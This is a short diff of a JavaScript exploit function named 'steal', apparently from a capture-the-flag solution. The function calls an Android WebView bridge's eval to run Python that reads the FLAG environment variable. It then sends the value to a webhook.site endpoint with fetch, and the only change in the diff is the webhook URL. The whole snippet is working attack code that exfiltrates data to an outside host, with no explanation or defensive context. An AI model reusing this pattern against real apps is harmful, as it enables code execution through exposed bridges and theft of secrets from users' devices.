@@ -4,7 +4,7 @@ function steal(attempt) {
     const result = window.AndroidBridge.eval(
       "import os\nprint(os.environ.get('FLAG', 'NOFLAG'))"
     );
-    fetch('https://webhook.site/2734bd6c-a958-43a6-be94-8b2e74a26072' + encodeURIComponent(result));
+    fetch('https://webhook.site/e1ecab05-4c12-42b1-ba43-5744be27249a' + encodeURIComponent(result));
   } else if (attempt < 40) {
     setTimeout(() => steal(attempt + 1), 250);
   }
